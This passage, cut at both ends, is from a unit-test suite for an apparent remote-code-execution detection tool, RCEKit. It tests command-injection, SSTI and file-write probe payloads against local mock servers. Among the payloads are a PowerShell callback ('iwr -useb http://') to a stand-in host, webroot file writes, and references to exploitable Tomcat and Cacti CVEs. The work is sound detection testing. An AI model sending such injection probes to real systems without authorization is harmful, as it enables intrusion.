                record = make_record(environment="windows", context=context)
                self.assertEqual(rcekit.sink_env_for(record, {}), "powershell")

    def test_an_explicit_dialect_wins_over_every_inference(self):
        # The corpus environment names the application runtime, not the OS: a
        # PHP application on IIS is a case only the operator can see.
        record = make_record(environment="php", context="raw")
        self.assertEqual(rcekit.sink_env_for(record, {"sink_env": "windows"}), "windows")
        windows = make_record(environment="windows", context="powershell")
        self.assertEqual(rcekit.sink_env_for(windows, {"sink_env": "unix"}), "unix")

    def test_parse_sink_env_refuses_a_typo(self):
        self.assertIsNone(rcekit.parse_sink_env(None))
        self.assertIsNone(rcekit.parse_sink_env("auto"))
        self.assertEqual(rcekit.parse_sink_env(" PowerShell "), "powershell")
        with self.assertRaises(ValueError) as caught:
            rcekit.parse_sink_env("win32")
        # Silently falling back to POSIX is the one outcome an operator who
        # reached for this flag is trying to avoid.
        self.assertIn("win32", str(caught.exception))

    # -- the cores -----------------------------------------------------------

    def _probes(self, method, record, config=None):
        import random as _random
        return method(self.gen, config or {}).build_probes(record, _random.Random(3))

    def test_a_powershell_carrier_no_longer_gets_the_cmd_core(self):
        record = make_record(environment="windows", context="powershell")
        payloads = [p.payload for p in self._probes(ReflectedMath, record)]
        self.assertTrue(payloads)
        for payload in payloads:
            self.assertNotIn("set /a", payload, "cmd.exe arithmetic on a PowerShell sink")
            self.assertNotIn("for /f", payload)

    def test_the_powershell_core_computes_a_product_locally(self):
        record = make_record(environment="windows", context="powershell")
        probes = self._probes(ReflectedMath, record)
        self.assertTrue(probes)
        for probe in probes:
            operands = re.search(r"\$\((\d+)\*(\d+)\)", probe.payload)
            self.assertIsNotNone(operands, probe.payload)
            product = int(operands.group(1)) * int(operands.group(2))
            # Reflection returns the literal `$(a*b)`, never the product.
            self.assertIn(str(product), probe.expected)
            self.assertEqual(probe.forbidden, operands.group(0))

    def test_the_canonical_powershell_core_carries_no_quote(self):
        # An unquoted PowerShell argument is an expandable string, so the core
        # needs no quote -- which is what lets the quote-wrapping contexts carry
        # it at all (see _context_swallows).
        record = make_record(environment="windows", context="powershell")
        probes = self._probes(ReflectedMath, record, {"probe_depth": "quick"})
        self.assertTrue(probes)
        for probe in probes:
            self.assertNotIn('"', probe.payload)
            self.assertNotIn("'", probe.payload)

    def test_powershell_writes_with_set_content_not_a_redirect(self):
        # `>` is Out-File, whose default encoding on Windows PowerShell 5.1 is
        # UTF-16LE: the write would land and the read-back would still not find
        # the token, so the probe would report negative on a target it owned.
        record = make_record(environment="windows", context="powershell")
        config = {"file_write_path": "C:\\inetpub\\wwwroot",
                  "file_read_url": "http://t/{name}"}
        probes = self._probes(FileBased, record, config)
        self.assertTrue(probes)
        for probe in probes:
            self.assertIn("Set-Content -Path C:\\inetpub\\wwwroot\\rcekit-", probe.payload)
            self.assertNotIn(">", probe.payload)
            self.assertTrue(probe.followup["cleanup"].startswith("Remove-Item -Force "))

    def test_powershell_sleeps_in_milliseconds(self):
        method = ParametricTime(self.gen, {})
        # -Seconds takes an integer, so a fractional --time-base would collapse
        # two of the regression's three levels onto each other.
        self.assertEqual(method._sleep_core(2.5, "powershell"),
                         "Start-Sleep -Milliseconds 2500")
        self.assertEqual(method._sleep_core(0.0, "powershell"),
                         "Start-Sleep -Milliseconds 0")
        self.assertEqual(method._sleep_core(2.0, "unix"), "sleep 2")

    def test_powershell_calls_back_without_a_nested_shell(self):
        record = make_record(environment="windows", context="powershell")
        probes = self._probes(rcekit.OobCallback, record,
                              {"oob_host": "oob.example", "probe_depth": "quick"})
        payloads = [p.payload for p in probes]
        self.assertTrue(any("iwr -useb http://" in p for p in payloads), payloads)
        # The cmd.exe shape reaches PowerShell through `powershell -c "..."`,
        # and those double quotes are what stop a quoted context carrying it.
        self.assertFalse([p for p in payloads if "powershell -c" in p])

    def test_the_unix_cores_are_unchanged(self):
        # Backward compatibility: the dialect split must not move the shape that
        # every existing target is confirmed by.
        record = make_record(environment="unix", context="raw")
        payloads = [p.payload for p in self._probes(ReflectedMath, record)]
        self.assertTrue(any("$((" in p for p in payloads), payloads)
        self.assertEqual(ParametricTime(self.gen, {})._sleep_core(2.0), "sleep 2")

    # -- separators and carriers ---------------------------------------------

    def test_powershell_has_no_pipe_break_out(self):
        # Measured: `cmd | Start-Sleep -Milliseconds 500` is a parameter-binding
        # error, not a fresh command with stdin attached, and it fails that way
        # for every cmdlet these probes use.
        separators = ReflectedMath(self.gen)._separators("powershell")
        self.assertNotIn("| ", separators)
        self.assertEqual(separators[0], "; ")
        self.assertIn("\n", separators)

    def test_the_chain_rung_resolves_per_dialect(self):
        method = ReflectedMath(self.gen, {"sink_shapes": ("chain",)})
        self.assertEqual(method._separators("powershell"), ("&& ", "|| "))
        self.assertEqual(method._separators("windows"), (" | ", " || ", " && "))
        self.assertEqual(method._separators("unix"), ("| ", "|| ", "&& "))

    def _contexts(self, environment, config=None):
        records = [make_record(environment=environment, context="raw")]
        carriers = self.gen._detection_carriers(iter(records), config or {})
        return sorted(c.context for c in carriers)

    def test_cmd_gets_no_quote_or_substitution_carriers(self):
        # cmd.exe has no comment character and no command substitution, so all
        # three rungs were previously built for it as payloads it cannot run.
        self.assertEqual(self._contexts("windows"), ["raw"])

    def test_powershell_gets_the_quote_rungs_but_not_the_backtick(self):
        # In PowerShell the backtick is the escape character, not a
        # substitution, so that context is inert there.
        contexts = self._contexts("unix", {"sink_env": "powershell"})
        self.assertIn("shell_subshell", contexts)
        self.assertIn("shell_single_quoted", contexts)
        self.assertNotIn("shell_backtick", contexts)

    def test_unix_keeps_both_substitution_forms(self):
        contexts = self._contexts("unix")
        self.assertIn("shell_subshell", contexts)
        self.assertIn("shell_backtick", contexts)

    def test_dotnet_also_gets_the_windows_dialect_carriers(self):
        # The one runtime whose corpus environment names a platform. Every other
        # runtime keeps the POSIX shape: a language does not say which OS it
        # runs on.
        self.assertEqual(
            [c for c in self._contexts("dotnet") if c in ("windows_cmd", "powershell")],
            ["powershell", "windows_cmd"])
        self.assertIn("raw", self._contexts("dotnet"))
        for runtime in ("java", "python", "php"):
            with self.subTest(runtime=runtime):
                contexts = self._contexts(runtime)
                self.assertNotIn("windows_cmd", contexts)
                self.assertNotIn("powershell", contexts)

    def test_pinning_the_dialect_suppresses_the_extra_carriers(self):
        # The operator has already answered the question the inference exists
        # for, so paying for a second dialect is not this function's call.
        self.assertEqual(self._contexts("dotnet", {"sink_env": "unix"}),
                         ["raw", "shell_backtick", "shell_double_quoted",
                          "shell_single_quoted", "shell_subshell"])

    def test_a_pinned_cmd_dialect_narrows_the_printed_ladder(self):
        # The pre-flight plan is an audit of the traffic about to be sent, so it
        # must not name rungs cmd.exe has no syntax for.
        shapes = rcekit.effective_sink_shapes({"sink_env": "windows"})
        self.assertEqual(shapes, ("sep", "raw", "chain"))
        self.assertEqual(rcekit.effective_sink_shapes({"sink_env": "powershell"}),
                         ("sep", "raw", "chain", "newline", "dq", "sq", "subshell"))

    # -- end to end ----------------------------------------------------------

    def test_a_powershell_only_sink_confirms(self):
        """A sink that understands *only* the PowerShell shape.

        The route stands in for `powershell.exe -Command`: it evaluates the
        subexpression the PowerShell core is built from and echoes anything else
        back verbatim, so a POSIX or cmd.exe probe reaching it can only be
        reflected. That is the whole asymmetry this phase closes -- the
        arithmetic shapes for the other two dialects are inert here, exactly as
        they are on a real Windows host."""
        def route(method, path, params, headers, body):
            raw = params.get("host", "")
            rendered = re.sub(r"\$\((\d+)\*(\d+)\)",
                              lambda m: str(int(m.group(1)) * int(m.group(2))), raw)
            return 200, "PING %s\n" % rendered

        record = make_record(environment="windows", context="powershell")
        with local_target(route) as base:
            results = self.gen.run_detection(
                [record], url=f"{base}/lookup?host=FUZZ", methods=["reflected"])
        confirmed = [r for r in results if r["verdict"] == "executed"]
        self.assertTrue(confirmed, results)
        self.assertEqual(rcekit.overall_detection_verdict(results), "executed")

        # And the same target, told the sink is POSIX: the probes are then
        # written in a dialect this sink does not evaluate, so nothing confirms.
        unix_record = make_record(environment="unix", context="raw")
        with local_target(route) as base:
            unix_results = self.gen.run_detection(
                [unix_record], url=f"{base}/lookup?host=FUZZ", methods=["reflected"],
                config={"sink_env": "unix"})
        self.assertFalse([r for r in unix_results if r["verdict"] == "executed"],
                         "a POSIX probe must not confirm on a sink that only "
                         "evaluates PowerShell")

    def test_a_dialect_with_no_shape_for_a_rung_tests_nothing_and_says_so(self):
        """The recurring defect class, restated for the dialect split.

        `--sink-env windows --sink-shape subshell` names a rung cmd.exe has no
        syntax for, so there is nothing to send. The run must report
        `nothing-tested`, not `negative`: a run that tested nothing reading as
        "not vulnerable" is the failure mode that most damages the tool."""
        def route(method, path, params, headers, body):
            return 200, "PING %s" % params.get("host", "")

        record = make_record(environment="windows", context="raw")
        config = {"sink_env": "windows", "sink_shapes": ("subshell",)}
        with local_target(route) as base:
            results = self.gen.run_detection(
                [record], url=f"{base}/lookup?host=FUZZ",
                methods=["reflected", "time"], config=config)
        self.assertEqual([r["verdict"] for r in results], [])
        self.assertEqual(rcekit.overall_detection_verdict(results), "nothing-tested")


class WriteThenExecuteTestCase(unittest.TestCase):
    """The `write` method: a write primitive proven to be RCE by executing it.

    The inverse of `file`. Nothing in the vulnerable response is computed — the
    request stores a file — so `reflected` and `eval` correctly report
    `negative` on a target that is fully exploitable. The three tiers this
    method separates are the whole point, and merging any two of them would be
    a lie in one direction or the other."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")
        self.read_url = "/uploads/rcekit-probe.jsp"

    def _method(self, **config):
        config.setdefault("write_read_url", "https://target.example/uploads/probe.jsp")
        return rcekit.WriteThenExecute(self.gen, config)

    def _probes(self, method=None, record=None, seed=4):
        import random as _random
        return (method or self._method()).build_probes(
            record or self.rec, _random.Random(seed))

    def test_the_product_fits_a_signed_32_bit_int(self):
        """The interpreter on the other side is usually not Python.

        JSP and ASPX are 3 of the 5 languages this method writes, and both
        evaluate `a*b` as a 32-bit signed int. RCEKit computes the same
        expression in Python, where it does not overflow, so a product past
        2**31-1 makes the two disagree and the run reports `negative` against a
        target that is fully exploitable.

        Measured against Tomcat 8.5.19 (CVE-2017-12615), writing the probe by
        PUT and fetching it back: `97233*38786` came back `-523688158` where
        RCEKit expected `3771279138`, and `4721*8093` came back `38207053`,
        matching exactly. With the old range, 56% of runs drew a pair that
        overflows -- and the operands are drawn once per run, so there is no
        second probe to save it.

        Many seeds, because one is a sample of a range and the claim is about
        the range."""
        ceiling = 2 ** 31 - 1
        import random as _random
        for seed in range(400):
            method = self._method(write_langs=["jsp"])
            method.build_probes(self.rec, _random.Random(seed))
            a, b, _t1, _t2 = method._operands
            with self.subTest(seed=seed):
                self.assertLessEqual(
                    a * b, ceiling,
                    f"seed {seed}: {a}*{b} = {a * b} overflows a signed 32-bit "
                    f"int, so a JSP or ASPX target computes something else")

    def test_a_target_whose_ints_are_32_bit_still_confirms(self):
        """The same claim from the outside: a store that interprets the file the
        way a JVM does confirms rather than coming back negative.

        The route is the one that failed on Tomcat -- write the probe, fetch it
        back, read the product -- with the evaluator wrapping to 32 bits the way
        `<%= %>` does. Nothing here is about the delimiters; it is about the
        width of the integer behind them."""
        def route(method, path, params, headers, body):
            if path == self.read_url:
                content = store.get("file")
                if content is None:
                    return 404, "Not Found"

                def wrap(match):
                    product = int(match.group(1)) * int(match.group(2))
                    # Two's-complement wrap into a signed 32-bit int, which is
                    # what a JVM does and what Python does not.
                    return str((product + 2 ** 31) % 2 ** 32 - 2 ** 31)

                return 200, re.sub(r"<%=\s*(\d+)\*(\d+)\s*%>", wrap, content)
            store["file"] = params.get("content", "")
            return 200, "stored"

        store = {}
        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/upload?content=FUZZ", methods=["write"],
                config={"write_read_url": base + self.read_url})
        self.assertEqual(
            rcekit.overall_detection_verdict(results), "executed",
            "a target whose ints are 32 bits did not confirm: "
            + "; ".join(r.get("detail", "") for r in results))

    def test_the_written_probe_carries_no_whitespace(self):
        """A sink that splits its input on whitespace gets a broken file.

        Measured against the sink this was written for: RRDtool 1.7.2, reached
        through Cacti's `right_axis_label` (CVE-2025-24367), writes the file
        from a `LINE1:out:<content>` argument. Fed
        `RKAAA<?=7*6?>RKBBB` it produced a 47-byte file with the content
        intact; fed `RKAAA<?= 7*6 ?>RKBBB` it produced no file at all and
        answered `ERROR: '7*6' is not a valid function name in 7*6`. The
        whitespace was the whole difference.

        Whitespace inside `<?= ?>` and `<%= %>` is optional, so dropping it
        costs nothing and buys every sink that tokenises on spaces. The probe is
        asserted whole rather than the templates alone, because the tags and the
        expression are substituted in and any one of them could reintroduce a
        space."""
        for lang in sorted(rcekit.WriteThenExecute.LANGUAGES):
            if lang == "jspx":
                # XML, and its root element carries namespace attributes that
                # cannot lose their spaces. A sink that tokenises on whitespace
                # was never going to carry a jspx document anyway.
                continue
            with self.subTest(language=lang):
                probes = self._probes(self._method(write_langs=[lang]))
                self.assertTrue(probes, f"{lang} built no probe")
                for probe in probes:
                    self.assertNotRegex(
                        probe.payload, r"\s",
                        f"{lang} probe carries whitespace: {probe.payload!r}")

    def test_the_language_templates_declare_no_whitespace(self):
        """The same claim one level down, so a new language cannot arrive with a
        space in it and be caught only by whichever sink it silently fails
        against."""
        for lang, spec in rcekit.WriteThenExecute.LANGUAGES.items():
            if lang == "jspx":
                continue
            with self.subTest(language=lang):
                self.assertNotRegex(
                    spec["template"], r"\s",
                    f"{lang} template carries whitespace: {spec['template']!r}")

    def _store_target(self, mode):
        """A target with a write primitive, in one of three postures.

        `exec` interprets the stored file, `verbatim` serves it as text, and
        `nowrite` stores nothing at all — the three outcomes the method has to
        tell apart."""
        store = {}

        def route(method, path, params, headers, body):
            if path == self.read_url:
                content = store.get("file")
                if content is None:
                    return 404, "Not Found"
                if mode == "exec":
                    return 200, re.sub(r"<%=\s*(\d+)\*(\d+)\s*%>",
                                       lambda m: str(int(m.group(1)) * int(m.group(2))),
                                       content)
                return 200, content
            if mode != "nowrite":
                store["file"] = params.get("content", "")
            return 200, "stored"

        return route

    # -- probe shape ---------------------------------------------------------

    def test_the_probe_is_a_file_body_not_a_shell_command(self):
        for probe in self._probes():
            self.assertNotIn(";", probe.payload.split("<")[0])
            self.assertFalse(probe.payload.startswith(("; ", "| ", "&& ")))

    def test_the_product_is_computed_locally_from_random_operands(self):
        low = rcekit.WriteThenExecute.OPERAND_LOW
        high = rcekit.WriteThenExecute.OPERAND_HIGH
        for probe in self._probes():
            operands = re.search(r"(\d+)\*(\d+)", probe.payload)
            self.assertIsNotNone(operands, probe.payload)
            a, b = int(operands.group(1)), int(operands.group(2))
            # Read off the declared range rather than a hard-coded digit count,
            # which pinned the width and not the behaviour -- and assert the
            # range, which the width only implied, so operands cannot drift out
            # of it unnoticed.
            for operand in (a, b):
                self.assertTrue(low <= operand <= high,
                                f"{operand} is outside the declared operand "
                                f"range {low}-{high}")
            product = a * b
            self.assertIn(str(product), probe.expected)
            # Reflection returns the one-liner, never the product.
            self.assertNotIn(str(product), probe.payload)

    def test_operands_are_drawn_once_per_run_not_once_per_carrier(self):
        """One write, not one per carrier.

        Carriers reduce to (environment, context) pairs and there are a dozen
        of them with the raw context alone. Fresh operands per carrier would be
        random in the same sense and would also write the file a dozen times —
        for a state-changing method that is not a cost, it is a blast radius."""
        method = self._method()
        first = [p.payload for p in self._probes(method)]
        second = [p.payload for p in self._probes(
            method, make_record(environment="php", context="raw"))]
        self.assertEqual(first, second)
        # A fresh run does draw new operands: the instance is what pins them,
        # not the method.
        self.assertNotEqual(
            first, [p.payload for p in self._probes(self._method(), seed=9)])

    def test_languages_sharing_a_template_share_a_probe(self):
        method = self._method(write_read_url="https://target.example/download?id=7")
        carriers = [p.carrier for p in self._probes(method)]
        # Which interpreter ran identical bytes is not something the response
        # can distinguish, so the finding names all of them rather than guessing.
        self.assertIn("jsp/aspx/erb", carriers)
        self.assertEqual(len(carriers), 3, carriers)

    def test_auto_infers_the_language_from_the_read_back_url(self):
        cases = [("https://t/x/probe.jsp", ["jsp"]), ("https://t/a.phtml", ["php"]),
                 ("https://t/a.jspx", ["jspx"]), ("https://t/a.aspx", ["aspx"])]
        for url, expected in cases:
            with self.subTest(url=url):
                self.assertEqual(self._method(write_read_url=url)._selected_languages(),
                                 expected)

    def test_an_extension_it_cannot_read_writes_every_language(self):
        # Guessing would be worse than paying for three requests.
        method = self._method(write_read_url="https://t/download?file=probe.jsp")
        self.assertEqual(len(method._selected_languages()), len(method.LANGUAGES))

    def test_parse_write_langs_refuses_a_typo(self):
        self.assertIsNone(rcekit.parse_write_langs(None))
        self.assertIsNone(rcekit.parse_write_langs("auto"))
        self.assertEqual(rcekit.parse_write_langs("jsp, php"), ("jsp", "php"))
        with self.assertRaises(ValueError) as caught:
            rcekit.parse_write_langs("jsp,jsp2")
        self.assertIn("jsp2", str(caught.exception))

    # -- applicability -------------------------------------------------------

    def test_it_needs_the_read_back_url(self):
        self.assertFalse(rcekit.WriteThenExecute(self.gen, {}).applicable(self.rec))
        self.assertEqual(
            self._probes(rcekit.WriteThenExecute(self.gen, {})), [])

    def test_it_declines_the_break_out_contexts_and_keeps_the_transport_ones(self):
        # The payload is the whole file, so there is no surrounding command or
        # query to break out of; wrapping it in "'; ... -- " writes a broken
        # file. A transport context is the opposite case — the payload has to
        # survive that serialization to land intact.
        method = self._method()
        for context in ("sql", "javascript", "php", "shell_single_quoted", "attribute"):
            with self.subTest(context=context):
                self.assertFalse(method.applicable(make_record(context=context)))
        for context in ("raw", "json", "xml", "yaml"):
            with self.subTest(context=context):
                self.assertTrue(method.applicable(make_record(context=context)))

    def test_a_json_body_still_lands_intact(self):
        method = self._method(write_read_url="https://t/a.jspx")
        probe = self._probes(method, make_record(context="json"))[0]
        self.assertIn(chr(92) + '"', probe.payload)
        # The fetched file carries the decoded content, so that is what the
        # verbatim check must look for.
        self.assertNotIn(chr(92) + '"', probe.forbidden)

    # -- the three tiers -----------------------------------------------------

    def test_an_interpreted_upload_directory_is_confirmed(self):
        with local_target(self._store_target("exec")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/upload?content=FUZZ", methods=["write"],
                config={"write_read_url": base + self.read_url})
        self.assertEqual(rcekit.overall_detection_verdict(results), "executed")
        confirmed = [r for r in results if r["verdict"] == "executed"]
        self.assertTrue(confirmed)
        self.assertIn("EXECUTED", confirmed[0]["detail"])
        self.assertIn("remove the file", confirmed[0]["cleanup"])

    def test_a_served_but_uninterpreted_directory_is_needs_review(self):
        """The distinction the method exists for.

        An upload directory that is served but not interpreted is a real
        finding and is not remote code execution. Calling it `executed` would
        break the guarantee the whole tool rests on; calling it `negative`
        would throw away an arbitrary file write.

        It is `file-write` and not `needs-review`: the file is on the target and
        RCEKit read it back, so there is nothing here under review. Until 3.0.0
        this reported `needs-review` while its own evidence line opened with the
        word "executed"."""
        with local_target(self._store_target("verbatim")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/upload?content=FUZZ", methods=["write"],
                config={"write_read_url": base + self.read_url})
        self.assertEqual(rcekit.overall_detection_verdict(results), "file-write")
        self.assertFalse([r for r in results if r["verdict"] == rcekit.EXECUTION_TIER])
        self.assertFalse([r for r in results if r["verdict"] == "needs-review"],
                         "a write RCEKit read back is not a candidate")
        written = [r for r in results if r["verdict"] == "file-write"]
        self.assertTrue(written)
        self.assertIn("ARBITRARY FILE WRITE", written[0]["detail"])
        # And the evidence no longer contradicts its own status. The string used
        # to open "ARBITRARY FILE WRITE confirmed" under a `needs-review`
        # verdict -- the tool's own prose disagreeing with the tool's own tier.
        # Pinned on the exact opening, because the words "not executed" appear
        # later in the same sentence and legitimately so.
        self.assertTrue(written[0]["detail"].startswith("ARBITRARY FILE WRITE --"),
                        written[0]["detail"])
        # The artifact is on the target either way, so the cleanup line rides
        # with this tier too.
        self.assertIn("remove the file", written[0]["cleanup"])

    def test_the_verbatim_finding_prints_its_cleanup_line_through_the_cli(self):
        """The regression that moving this tier could have introduced.

        A `cleanup` key in the result dict is not the operator seeing it. The
        line was printed in two places in the whole report -- the execution
        section, and the NEEDS-REVIEW block this verdict used to share with
        `time`, `boolean` and `deser`'s fingerprint. Moving it to its own tier
        moved it out of the only block that printed it, and the file is on the
        target: an unmentioned artifact is the thing the cleanup line exists to
        prevent. Driven through the real CLI, because that is where the gap
        would have been."""
        with local_target(self._store_target("verbatim")) as base:
            result = subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent",
                 "--verify-url", f"{base}/upload?content=FUZZ",
                 "--methods", "write", "--verify-active-risk", "stateful",
                 "--write-url-template", base + self.read_url,
                 "--environments", "unix", "--contexts", "raw"],
                capture_output=True, text=True, timeout=300)
        self.assertIn("ARBITRARY FILE WRITE", result.stdout, result.stdout[-2000:])
        self.assertIn("cleanup:", result.stdout, result.stdout[-2000:])
        self.assertNotIn("NEEDS-REVIEW", result.stdout)

    def test_a_target_that_stores_nothing_is_negative(self):
        with local_target(self._store_target("nowrite")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/upload?content=FUZZ", methods=["write"],
                config={"write_read_url": base + self.read_url})
        self.assertEqual(rcekit.overall_detection_verdict(results), "negative")
        self.assertTrue(results)

    def test_a_read_back_url_that_never_answers_is_an_error_not_a_negative(self):
        # A delivery failure on the confirmation channel says nothing about the
        # target, and reporting it as `negative` would be the same defect this
        # project keeps finding under a new name.
        with local_target(self._store_target("exec")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/upload?content=FUZZ", methods=["write"],
                config={"write_read_url": "http://127.0.0.1:1/nothing-here.jsp"})
        self.assertEqual(rcekit.overall_detection_verdict(results), "error")
        self.assertTrue(all(r["verdict"] == "error" for r in results), results)

    def test_a_control_that_already_carries_the_value_is_inconclusive(self):
        # The differential still governs: a computed value present without the
        # payload is not attributable to execution.
        method = self._method()
        probe = self._probes(method)[0]
        obs = Observation(status=200, body="", control_body=probe.expected,
                          followup_body=probe.expected)
        self.assertEqual(method.confirm(obs, probe).status, "inconclusive")

    def test_the_write_method_does_not_ride_the_sink_shape_ladder(self):
        # Its probes are file content, not shell, so no separator or quote
        # break-out applies — the same reason `eval` is absent.
        self.assertNotIn("write", rcekit.SHELL_PROBE_METHODS)
        self.assertNotIn("write", rcekit.CHEAP_DETECTION_METHODS)
        self.assertIn("write", rcekit.STATE_CHANGING_METHODS)


class ObservedChannelTestCase(unittest.TestCase):
    """Second-order execution: the probe lands on one request and runs on another.

    Stored SSTI rendered on a profile page, a payload written to a log a
    template engine later renders, a queued job. The engine diffs the response
    it injected into, so every one of these read `negative` however exploitable
    the target was.

    It stays fully differential — which is why it can legitimately reach
    `executed` — and the rule that keeps it so is that a probe's value is
    looked for on the observed channel **only when the payload does not already
    carry it**. Without that rule, `file` and `oob` (whose expected value is a
    token sitting verbatim in the payload) would confirm on any target that
    merely stores the payload and renders it back."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    @staticmethod
    def _render_ssti(text):
        return re.sub(r"\{\{\s*(\d+)\*(\d+)\s*\}\}",
                      lambda m: str(int(m.group(1)) * int(m.group(2))), text)

    def _stored_route(self, render, store="overwrite", seed=""):
        """A target that stores on one path and shows it on another.

        `overwrite` is the shape the acceptance case uses (a profile field);
        `append` is the log/comment-list shape. They exercise different halves
        of the machinery, so both are modelled."""
        held = {"value": seed}

        def route(method, path, params, headers, body):
            if path == "/profile":
                return 200, "<h1>bio</h1>" + render(held["value"])
            if store == "append":
                held["value"] += "\n" + params.get("bio", "")
            else:
                held["value"] = params.get("bio", "")
            return 200, "saved"

        return route

    # -- the eligibility rule ------------------------------------------------

    def test_only_a_value_absent_from_its_own_payload_is_observable(self):
        observable = {"expected": "RKA123RKB", "payload": "RKA$((1+2))RKB"}
        reflected_token = {"expected": "RKTOKEN", "payload": "echo RKTOKEN > /tmp/x"}
        self.assertTrue(RCEKit._observable(observable))
        self.assertFalse(RCEKit._observable(reflected_token))
        self.assertFalse(RCEKit._observable({"expected": "", "payload": "sleep 2"}))

    def test_a_store_and_echo_target_confirms_nothing(self):
        """The false-positive vector, driven end to end.

        The app stores the payload and renders it verbatim — no evaluation
        anywhere. Every probe's payload comes back on the observed page, so a
        naive implementation would confirm all of them."""
        with local_target(self._stored_route(lambda text: text)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/bio?bio=FUZZ", methods=["eval"],
                max_payloads=12,
                config={"observe_url": f"{base}/profile", "observe_poll": 0.2,
                        "observe_timeout": 0.5})
        self.assertFalse([r for r in results if r["verdict"] == "executed"],
                         "a target that only echoes the payload must not confirm")
        self.assertEqual({r["observe_status"] for r in results}, {"polled"})

    # -- the two channel shapes ----------------------------------------------

    def test_stored_ssti_on_an_overwriting_field_confirms(self):
        """The acceptance case: inject on POST, execution renders on GET.

        The store *overwrites*, so every probe but the last is gone by the time
        a post-batch poll would run — the observed channel has to be read
        between probes or this oracle confirms nothing on the shape it exists
        for."""
        with local_target(self._stored_route(self._render_ssti)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/bio?bio=FUZZ", methods=["eval"],
                max_payloads=12,
                config={"observe_url": f"{base}/profile", "observe_poll": 0.2,
                        "observe_timeout": 1.0})
        confirmed = [r for r in results if r["verdict"] == "executed"]
        self.assertTrue(confirmed, results)
        self.assertEqual(rcekit.overall_detection_verdict(results), "executed")
        self.assertIn("OBSERVED channel", confirmed[0]["detail"])
        self.assertEqual(confirmed[0]["observe_status"], "executed")

    def test_an_appending_channel_confirms_after_the_batch(self):
        with local_target(self._stored_route(self._render_ssti, store="append")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/bio?bio=FUZZ", methods=["eval"],
                max_payloads=12,
                config={"observe_url": f"{base}/profile", "observe_poll": 0.2,
                        "observe_timeout": 1.0})
        self.assertEqual(rcekit.overall_detection_verdict(results), "executed")

    # -- the differential ----------------------------------------------------

    def test_a_value_already_in_the_pre_injection_control_does_not_confirm(self):
        """The control is taken before any probe, and it has to be.

        The premise is that a probe changes what the endpoint renders, so a
        control taken afterwards would already contain what it is meant to rule
        out."""
        method = rcekit.ReflectedMath(self.gen, {})
        result = {"verdict": "negative", "expected": "RKA999RKB",
                  "payload": "RKA$((1+2))RKB", "detail": ""}
        control = [("response body", "nightly report: RKA999RKB")]
        upgraded = self.gen._observe_match(
            result, [("response body", "RKA999RKB")], control, "http://t/o")
        self.assertFalse(upgraded)
        self.assertEqual(result["verdict"], "negative")
        self.assertEqual(result["observe_status"], "in-control")
        del method

    def test_one_probes_leftover_value_cannot_confirm_another(self):
        # Each probe carries its own operands, so a value an earlier probe left
        # on a shared channel does not match a later probe's expectation.
        first = {"verdict": "negative", "expected": "RKA111RKB",
                 "payload": "RKA$((1+2))RKB", "detail": ""}
        second = {"verdict": "negative", "expected": "RKC222RKD",
                  "payload": "RKC$((3+4))RKD", "detail": ""}
        channels = [("response body", "RKA111RKB")]
        self.assertTrue(self.gen._observe_match(first, channels, [], "http://t/o"))
        self.assertFalse(self.gen._observe_match(second, channels, [], "http://t/o"))

    # -- it is additive ------------------------------------------------------

    def test_a_run_without_the_flag_is_unchanged(self):
        with local_target(self._stored_route(self._render_ssti)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/bio?bio=FUZZ", methods=["eval"])
        self.assertTrue(results)
        # No observe bookkeeping at all, and no second-order confirmation: the
        # in-band response says "saved" and nothing else.
        self.assertFalse([r for r in results if "observe_status" in r])
        self.assertFalse([r for r in results if r["verdict"] == "executed"])

    def test_an_in_band_confirmation_is_never_downgraded(self):
        # Only a non-confirmed verdict can be upgraded, so observing can add
        # findings and never remove one.
        def route(method, path, params, headers, body):
            if path == "/observe":
                return 200, "nothing here"
            return 200, "PING " + self._render_ssti(params.get("q", ""))

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/search?q=FUZZ", methods=["eval"],
                max_payloads=12,
                config={"observe_url": f"{base}/observe", "observe_poll": 0.2,
                        "observe_timeout": 0.5})
        confirmed = [r for r in results if r["verdict"] == "executed"]
        self.assertTrue(confirmed)
        for result in confirmed:
            self.assertNotIn("OBSERVED", result["detail"])

    # -- failure modes -------------------------------------------------------

    def test_an_unreachable_observed_endpoint_is_reported_as_such(self):
        """A run that never read the channel is not a second-order negative.

        The same failure this project keeps finding: the operator asked for an
        oracle, it never ran, and the verdicts below were decided without it."""
        with local_target(self._stored_route(self._render_ssti)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/bio?bio=FUZZ", methods=["eval"],
                max_payloads=6,
                config={"observe_url": "http://127.0.0.1:1/gone", "observe_poll": 0.2,
                        "observe_timeout": 0})
        self.assertTrue(results)
        self.assertEqual({r["observe_status"] for r in results}, {"unreachable"})

    def test_a_zero_timeout_reads_once_and_does_not_wait(self):
        """`--observe-timeout 0` means "read it once", not "use the default".

        It is falsy, so an `or`-style default silently turned a deliberate
        no-wait read into a full minute of polling — measured against a dead
        endpoint, where the run then took 60 seconds to say nothing."""
        import time as _time
        started = _time.time()
        with local_target(self._stored_route(self._render_ssti)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/bio?bio=FUZZ", methods=["eval"], max_payloads=4,
                config={"observe_url": "http://127.0.0.1:1/gone", "observe_timeout": 0})
        self.assertLess(_time.time() - started, 20)
        self.assertEqual({r["observe_status"] for r in results}, {"unreachable"})

    def test_one_poll_always_happens_even_at_a_zero_timeout(self):
        with local_target(self._stored_route(self._render_ssti, store="append")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/bio?bio=FUZZ", methods=["eval"],
                max_payloads=6,
                config={"observe_url": f"{base}/profile", "observe_timeout": 0})
